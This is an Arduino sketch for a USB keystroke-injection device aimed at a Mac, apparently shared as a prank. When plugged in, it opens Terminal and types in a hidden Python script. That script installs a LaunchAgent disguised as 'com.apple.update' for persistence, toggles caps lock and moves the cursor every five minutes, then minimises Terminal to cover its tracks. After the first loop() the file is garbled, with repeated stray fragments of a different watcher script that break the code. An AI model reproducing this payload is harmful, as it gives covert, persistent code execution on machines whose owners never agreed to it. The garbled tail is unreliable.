#include <Keyboard.h>
#include <Mouse.h>

// Arduino Pro Micro / Leonardo — Mac Caps + Mouse Troll
//
// Phase 1 (while plugged in): mouse moves chaotically
// Phase 2 (after unplug, persistent): alternates caps lock toggle
//         and mouse teleport to a random corner every 5 minutes
//
// To remove from target Mac:
//   launchctl unload ~/Library/LaunchAgents/com.apple.update.plist
//   rm -f ~/Library/LaunchAgents/com.apple.update.plist
//   pkill -f /tmp/.c.py; rm -f /tmp/.c.py

void typeln(const __FlashStringHelper* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
}

void setup() {
  Keyboard.begin();
  Mouse.begin();
  randomSeed(analogRead(A0));
  delay(3000);

  // --- Phase 1: Mouse chaos while plugged in (~30 seconds) ---
  for (int i = 0; i < 150; i++) {
    Mouse.move(random(-127, 127), random(-127, 127), 0);
    delay(200);
  }

  delay(500);

  // --- Phase 2: Install persistent caps + mouse prank ---

  // Cmd+Space → Spotlight → Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print(F("Terminal"));
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4000);

  // Write the persistent script
  typeln(F("cat>/tmp/.c.py<<'E'"));
  typeln(F("import subprocess,time,plistlib,os,pathlib,random"));
  typeln(F("la=os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')"));
  typeln(F("pathlib.Path(os.path.dirname(la)).mkdir(exist_ok=True)"));
  typeln(F("if not os.path.exists(la):"));
  typeln(F(" d={'Label':'com.apple.update','ProgramArguments':['/usr/bin/python3','/tmp/.c.py'],'RunAtLoad':True}"));
  typeln(F(" open(la,'wb').write(plistlib.dumps(d))"));
  typeln(F(" subprocess.run(['launchctl','load',la])"));
  typeln(F("def caps():subprocess.run(['osascript','-e','tell application \"System Events\" to key code 57'])"));
  typeln(F("def mouse():"));
  typeln(F(" try:"));
  typeln(F("  from Quartz import CGWarpMouseCursorPosition,CGMainDisplayID"));
  typeln(F("  corners=[(0,0),(1920,0),(0,1080),(1920,1080)]"));
  typeln(F("  CGWarpMouseCursorPosition(random.choice(corners))"));
  typeln(F(" except:pass"));
  typeln(F("acts=[caps,mouse,caps,mouse]"));
  typeln(F("i=0"));
  typeln(F("while True:"));
  typeln(F(" acts[i%4]()"));
  typeln(F(" i+=1"));
  typeln(F(" time.sleep(300)"));
  typeln(F("E"));

  // Launch silently and hide Terminal
  typeln(F("nohup python3 /tmp/.c.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}

void loop() {}
  typeln(F("     fired.add(key)"));
  typeln(F("     if cmd=='STOP':stop=True;break"));
  typeln(F("     if cmd in cmds:cmds[cmd]()"));
  typeln(F("   except:pass"));
  typeln(F("  else:"));
  typeln(F("   key=(cmd,h)"));
  typeln(F("   if key not in fired:"));
  typeln(F("    fired.add(key)"));
  typeln(F("    if cmd=='STOP':stop=True;break"));
  typeln(F("    if cmd in cmds:cmds[cmd]()"));
  typeln(F(" if stop:"));
  typeln(F("  subprocess.run(['launchctl','unload',la])"));
  typeln(F("  try:os.remove(la)"));
  typeln(F("  except:pass"));
  typeln(F("  try:os.remove('/tmp/.t.py')"));
  typeln(F("  except:pass"));
  typeln(F("  break"));
  typeln(F(" time.sleep(30)"));
  typeln(F("E"));

  // Install Quartz, launch watcher silently, hide Terminal
  typeln(F("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}

void loop() {}
  typeln(F("     if cmd=='STOP':stop=True;break"));
  typeln(F("     if cmd in cmds:cmds[cmd]()"));
  typeln(F("   except:pass"));
  typeln(F("  else:"));
  typeln(F("   key=(cmd,h)"));
  typeln(F("   if key not in fired:"));
  typeln(F("    fired.add(key)"));
  typeln(F("    if cmd=='STOP':stop=True;break"));
  typeln(F("    if cmd in cmds:cmds[cmd]()"));
  typeln(F(" if stop:"));
  typeln(F("  subprocess.run(['launchctl','unload',la])"));
  typeln(F("  try:os.remove(la)"));
  typeln(F("  except:pass"));
  typeln(F("  try:os.remove('/tmp/.t.py')"));
  typeln(F("  except:pass"));
  typeln(F("  break"));
  typeln(F(" time.sleep(30)"));
  typeln(F("E"));

  // Install Quartz, launch watcher silently, hide Terminal
  typeln(F("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}

void loop() {}
